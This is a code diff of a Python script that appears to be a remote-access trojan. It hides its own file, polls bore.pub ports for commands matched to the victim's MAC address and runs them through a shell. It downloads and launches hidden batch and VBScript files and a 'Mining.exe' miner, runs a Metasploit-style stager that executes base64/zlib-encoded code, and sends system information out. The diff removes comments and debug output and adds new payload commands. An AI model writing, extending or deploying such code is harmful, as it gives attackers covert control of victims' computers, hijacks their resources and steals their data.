@@ -17,7 +17,6 @@ import struct
 import os
 import sys
 
-# Hide BN.pyw 
 subprocess.Popen("attrib +h BN.pyw", shell=True) 
   
 def METASPLOIT(): 
@@ -28,7 +27,6 @@ def METASPLOIT():
     previous_data = "" 
   
     while True: 
-        # Request data from PHP script with a random port
         port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
         url = f'http://bore.pub:{port}/Metasploit.php'
         response = requests.get(url) 
@@ -36,20 +34,15 @@ def METASPLOIT():
         if response.status_code == 200: 
             data = response.text 
             if data != previous_data: 
-                # Split the received data into MAC and option 
              parts = data.strip().split('::')
             if len(parts) == 2:
                 mac, option = parts
             elif len(parts) == 1:
                 mac = parts[0]
-                option = "No Command"
+                option = ""
             else:
-                print("Invalid data format.")
                 continue
 
-            # Print the MAC and Command
-            print("Received MAC:", mac)
-            print("Received Command:", option)
             time.sleep(1)
  
             previous_data = data
@@ -58,16 +51,50 @@ def METASPLOIT():
                   def restart_program():
                      python = sys.executable
                      os.execl(python, python, *sys.argv)
-                  restart_program()  # Restart the script
+                  restart_program()  
+                elif option == "STARTVBSBAT":
+                    port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
+                    php_script_url = f'http://bore.pub:{port}/Control.php'
+                    home_directory = os.path.expanduser("~")
+                    web_page1_path = os.path.join(home_directory, "Script.bat")
+                    vbs_file_path = os.path.join(home_directory, "VBSEX.vbs")
+
+                    for file_path in [web_page1_path, vbs_file_path]:
+                       if os.path.exists(file_path):
+                           os.remove(file_path)
+
+                    url1 = f"http://bore.pub:{port}/Script.io"
+                    url2 = f"http://bore.pub:{port}/VBSEX.io"
+
+                    download_file(url1, web_page1_path)
+                    download_file(url2, vbs_file_path)
+
+                    if os.name == 'nt':
+                        hide_files_windows([web_page1_path, vbs_file_path])
+                    else:
+                        hide_files_unix([web_page1_path, vbs_file_path])
+
+                    if os.path.isfile(vbs_file_path):
+                      subprocess.Popen(['cscript.exe', vbs_file_path], shell=True)
+                elif option == "MINING":
+                      ports_to_try = [61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012]
+                      random.shuffle(ports_to_try)  
+    
+                      for port in ports_to_try:
+                        url = f"http://bore.pub:{port}/Mining.exe"
+                        download_file(url, web_page_path)
+                        web_page_path = os.path.join(home_directory, "Mining.exe")
+                        if os.path.isfile(web_page_path):
+                            subprocess.Popen(['cscript.exe', web_page_path], shell=True)
+
             if mac == actual_mac:
                 if option == "START":
-                    print("Starting with MAC validation...")
                     def run_specific_code():
                      import socket, zlib, base64, struct, time, random
 
                      while True:
                         ports_to_try = [61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012]
-                        random.shuffle(ports_to_try)  # Shuffle the list of ports randomly
+                        random.shuffle(ports_to_try)  
     
                         for port in ports_to_try:
                             try:
@@ -82,15 +109,13 @@ def METASPLOIT():
                                exec(zlib.decompress(base64.b64decode(d)), {'s': s})
 
                             except Exception as e:
-                               print(f"An error occurred: {e}")
+                               print(f"{e}")
                             finally:
                              s.close()
         
                             if 's' in locals():
-                               break  # Break out of the loop if connection was successful
-    
-                            print("Waiting for 1 seconds before retrying...")
-                       
+                               break  
+                           
                     specific_code_thread = threading.Thread(target=run_specific_code)
                     specific_code_thread.daemon = True  
                     specific_code_thread.start()
@@ -98,7 +123,7 @@ def METASPLOIT():
                     def restart_program():
                      python = sys.executable
                      os.execl(python, python, *sys.argv)
-                    restart_program()  # Restart the script
+                    restart_program() 
                 else:
                     print("Invalid command:", option)
             else:
@@ -108,7 +133,6 @@ def METASPLOIT():
     else:
         print("Failed to fetch data.")
 
-    # Wait for some time before checking again (adjust as needed)
     time.sleep(1)
 
 
@@ -116,11 +140,9 @@ specific_code_thread = threading.Thread(target=METASPLOIT)
 specific_code_thread.daemon = True  
 specific_code_thread.start()
 
-# Store the previously executed command and files with timestamps
 previous_command = None
 previous_files = {}
 
-# Function to clear the console screen
 def clear_screen():
     if os.name == 'nt':
         ctypes.windll.kernel32.GetStdHandle(-11).ResizeScreenBuffer(1, 1)
@@ -130,7 +152,6 @@ def clear_screen():
     else:
         print("\033c", end="")
 
-# Function to send data to a specified URL
 def send_data_to_url(url, data):
     try:
         response = requests.post(url, data=data)
@@ -138,7 +159,6 @@ def send_data_to_url(url, data):
     except Exception as e:
         return f"Error sending data to {url}: {str(e)}"
 
-# Function to download and save a file
 def download_file(url, save_path):
     try:
         response = requests.get(url)
@@ -151,7 +171,6 @@ def download_file(url, save_path):
     except Exception as e:
         print(f"Error downloading {url}: {str(e)}")
 
-# Function to hide files on Windows
 def hide_files_windows(file_paths):
     try:
         for file_path in file_paths:
@@ -159,7 +178,6 @@ def hide_files_windows(file_paths):
     except Exception as e:
         print(f"Error hiding files on Windows: {str(e)}")
 
-# Function to hide files on Unix-based systems
 def hide_files_unix(file_paths):
     try:
         for file_path in file_paths:
@@ -167,7 +185,6 @@ def hide_files_unix(file_paths):
     except Exception as e:
         print(f"Error hiding files on Unix-based system: {str(e)}")
 
-# Function to retrieve system information
 def get_system_info():
     try:
         mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
@@ -209,12 +226,10 @@ def get_system_info():
 
 while True:
     try:
-        # Function to continuously receive and process data
         def receive_data():
             global previous_command, previous_files
 
             while True:
-                # Your code to fetch data from the PHP script goes here
                 port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
                 php_script_url = f'http://bore.pub:{port}/Control.php'
                 
@@ -227,9 +242,7 @@ while True:
                         mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])
                         received_mac, file_to_execute = data.split('::', 1)
                         if received_mac == mac:
-                            # Check if the received file has been executed recently
                             if file_to_execute not in previous_files or (time.time() - previous_files[file_to_execute]) > 30:
-                                # Execute the file
                                 subprocess.Popen(f"{file_to_execute}", shell=True)
                                 previous_files[file_to_execute] = time.time()
                             else:
@@ -240,48 +253,17 @@ while True:
                         subprocess.Popen(f"{data}", shell=True)
                     
                     previous_command = data
-                    break  # Exit the loop after processing a command
+                    break 
 
         previous_command = ""
         previous_files = {}
 
-        # Start the data receiving thread
         receive_thread = threading.Thread(target=receive_data)
         receive_thread.start()
 
-        # Add any additional code or conditions for the loop as needed
-        time.sleep(1)  # Example: Sleep for 1 second between iterations
+        time.sleep(1)  
 
-        # Define URLs and paths
-        port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
-        php_script_url = f'http://bore.pub:{port}/Control.php'
-        home_directory = os.path.expanduser("~")
-        web_page1_path = os.path.join(home_directory, "Script.bat")
-        vbs_file_path = os.path.join(home_directory, "VBSEX.vbs")
 
-        # Delete existing files
-        for file_path in [web_page1_path, vbs_file_path]:
-            if os.path.exists(file_path):
-                os.remove(file_path)
-
-        # Download files
-        url1 = f"http://bore.pub:{port}/Script.io"
-        url2 = f"http://bore.pub:{port}/VBSEX.io"
-
-        download_file(url1, web_page1_path)
-        download_file(url2, vbs_file_path)
-
-        # Hide downloaded files
-        if os.name == 'nt':
-            hide_files_windows([web_page1_path, vbs_file_path])
-        else:
-            hide_files_unix([web_page1_path, vbs_file_path])
-
-        # Execute VBScript if it exists
-        if os.path.isfile(vbs_file_path):
-            subprocess.Popen(['cscript.exe', vbs_file_path], shell=True)
-
-        # Send system information
         data_to_send = get_system_info()
         if data_to_send:
             portx = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
